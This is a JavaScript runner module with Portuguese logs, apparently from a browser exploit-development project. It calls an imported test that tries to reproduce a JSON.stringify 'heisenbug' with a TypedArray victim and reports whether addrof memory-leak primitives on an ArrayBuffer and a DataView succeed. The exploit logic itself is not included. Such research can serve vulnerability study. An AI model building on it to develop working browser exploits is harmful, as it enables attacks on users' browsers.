// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_StableC1LeakInMemory, // ATUALIZADO para v58
    FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM // ATUALIZADO para v58
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_StableC1LeakInMemory";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (StableC1LeakInMemory) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_StableC1LeakInMemory();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    // Mesmo que errorCapturedMain esteja definido (ex: circular ref), ainda queremos ver os resultados do addrof.
    // O `execute...` agora tenta o addrof "offline" se a serialização principal falhar.

    logS3(`  Resultado Bruto do Stringify: ${result.rawStringifyForAnalysis}`, "info", FNAME_RUNNER);
    logS3(`  Resultado Parseado do Stringify: ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "info", FNAME_RUNNER);


    let heisenbugOnC1 = false;
    const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
    if (call2Details && call2Details.C1_payloads_assigned) {
        heisenbugOnC1 = true;
        logS3(`  !!!! HEISENBUG NO C1_DETAILS (Call #2) & PAYLOAD ASSIGNMENT CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
    } else {
        logS3(`  ALERT: Heisenbug no C1_details (Call #2) ou payload assignment NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
    }

    let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

    if (result.addrof_A_result) {
        logS3(`    ADDROF A (ArrayBuffer): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
    }
    if (result.addrof_B_result) {
        logS3(`    ADDROF B (DataView): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
    }

    if (result.errorCapturedMain) {
         logS3(`  ERRO JS CAPTURADO DURANTE O TESTE: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
         if (result.errorCapturedMain.message.includes("circular structure")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: CircularERR, Addr:${anyAddrofSuccess?'OK':'Fail'}`;
         } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: JS_ERR, Addr:${anyAddrofSuccess?'OK':'Fail'}`;
         }
    } else {
        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: Addr SUCCESS!`;
        } else if (heisenbugOnC1) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}: No Heisenbug?`;
        }
    }

    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (StableC1LeakInMemory) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (StableC1LeakInMemory) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Ajuste final do título se necessário
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM)) {
        if (!document.title.includes("CRASH") &&
            !document.title.includes("SUCCESS") &&
            !document.title.includes("Fail") && // Cobre "Addr Fail" e "CRITICAL FAIL"
            !document.title.includes("ERR")) { // Cobre "JS_ERR" e "CircularERR"
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V58_SCLIM} Concluído`;
        }
    }
}
